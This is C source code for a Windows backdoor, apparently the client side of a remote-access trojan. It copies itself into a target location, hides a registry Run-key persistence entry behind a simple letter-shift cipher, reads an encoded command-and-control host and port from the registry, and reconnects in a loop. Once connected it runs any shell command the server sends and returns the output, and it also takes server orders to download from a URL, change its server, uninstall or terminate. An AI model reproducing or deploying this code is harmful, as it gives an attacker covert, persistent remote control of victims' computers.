#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cruft_utils.h"

#pragma comment(lib, "ws2_32.lib")

#define max_command_length   1024
#define sleepTime            1000

#define encPort             ""
#define encHost             ""
#define encHostKey          ""
#define encPortKey          ""
#define encPersistenceData  ""
#define encConnInfoKey      ""
#define encPersistenceKey   "vriwzduh_plfurvriw_zlqgrzv_fxuuhqwyhuvlrq_uxq"
#define encPersistenceValue ""

#define comReconnect        ""
#define comUninstall        ""
#define comDownload         ""
#define comTerminate        ""
#define comResetPort        ""
#define comResetHost        ""

void ExecuteServerCommand(SOCKET sock, const char* command) {
    char bufCommandOutput[max_command_length] = { 0 };
    FILE* commandPipe = _popen(command, "r");
    if (commandPipe) {
        while (fgets(bufCommandOutput, sizeof(bufCommandOutput), commandPipe) != NULL) {
            send(sock, bufCommandOutput, sizeof(bufCommandOutput), 0);
        }
        _pclose(commandPipe);    
    }

}

int main() {
    const int bufAddr = 16;
    const int bufPort = 6;
    char serverAddress[16];
    char serverPort[6];
    int  intServerPort;
    struct sockaddr_in SocketStructure;
    WSADATA WinSockData;
    char* pEncodedTargetExeData = encPersistenceData; 
    char pTargetExecutionData[MAX_PATH];
    char* pConnectionInformationKey = encConnInfoKey;
    char* pRegistryPersistenceKey = encPersistenceKey;
    char* pHostKeyValue = encHostKey;
    char* pPortKeyValue = encPortKey;
    char* pHostKeyData = encHost;
    char* pPortKeyData = encPort;
    char* pPersistenceKeyValue = encPersistenceValue;
    char currentPathInMemory[MAX_PATH];
    GetModuleFileNameA(0, currentPathInMemory, MAX_PATH);
    decodeCipher(pEncodedTargetExeData);
    ExpandEnvironmentStrings(pEncodedTargetExeData, pTargetExecutionData, MAX_PATH);
    if (strcmp(pTargetExecutionData, currentPathInMemory) != 0) {
        runInfectionCycle(pConnectionInformationKey,
                          pRegistryPersistenceKey,
                          pHostKeyValue,
                          pPortKeyValue,
                          pPersistenceKeyValue,
                          pHostKeyData,
                          pPortKeyData,
                          currentPathInMemory,
                          (char*)pTargetExecutionData);
    } 
    encodeCipher(pTargetExecutionData);
    WSAStartup(0x0202, &WinSockData);
connect:
    decodeCipher(pConnectionInformationKey);
    decodeCipher(pHostKeyValue);
    decodeCipher(pPortKeyValue);
    RegGetValueA(HKEY_CURRENT_USER, pConnectionInformationKey, pHostKeyValue, RRF_RT_REG_SZ, 0, &serverAddress, &bufAddr);
    RegGetValueA(HKEY_CURRENT_USER, pConnectionInformationKey, pPortKeyValue, RRF_RT_REG_SZ, 0, &serverPort, &bufPort);
    decodeCipher(serverAddress);
    decodeCipher(serverPort);
    intServerPort = atoi(serverPort);
    SocketStructure.sin_family      = AF_INET;
    SocketStructure.sin_port        = htons(intServerPort);
    SocketStructure.sin_addr.s_addr = inet_addr(serverAddress);
    encodeCipher(serverAddress);
    encodeCipher(serverPort);
    encodeCipher(pConnectionInformationKey);
    encodeCipher(pHostKeyValue);
    encodeCipher(pPortKeyValue);
    SOCKET clientSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    while (connect(clientSocket, (struct sockaddr*)&SocketStructure, sizeof(SocketStructure)) != 0) {
        Sleep(sleepTime);
    }
    char serverCommand[max_command_length];
    int  serverCommandLength;
    while (1) {
        serverCommandLength = recv(clientSocket, serverCommand, sizeof(serverCommand) - 1, 0);
        if (serverCommandLength <= 0) {
            goto connect;
        }
        serverCommand[serverCommandLength] = '\0';
        char commandCode[11];
        strncpy(commandCode, serverCommand, 10);
        commandCode[10] = '\0';
        if (strcmp((const char*)commandCode, comUninstall) == 0) {
            doUninstallation(pConnectionInformationKey,
                             pRegistryPersistenceKey,
                             pHostKeyValue,
                             pPortKeyValue,
                             pPersistenceKeyValue,
                             currentPathInMemory);
        }
        else if (strcmp((const char*)commandCode, comReconnect) == 0) {
            goto connect;
        }
        else if (strcmp((const char*)commandCode, comResetHost) == 0) {
            doNetworkInfoChange(pConnectionInformationKey, pHostKeyValue, serverCommand);
        }
        else if (strcmp((const char*)commandCode, comResetPort) == 0) {
            doNetworkInfoChange(pConnectionInformationKey, pPortKeyValue, serverCommand);
        }
        else if (strcmp((const char*)commandCode, comDownload) == 0) {
            doUrlDownload(serverCommand);
        }
        else if (strcmp((const char*)commandCode, comTerminate) == 0) {
            closesocket(clientSocket);
            WSACleanup();
            ExitProcess(0);
        }
        else {
            ExecuteServerCommand(clientSocket, serverCommand);
        }
    }
    WSACleanup();
    return 0;
} 




















































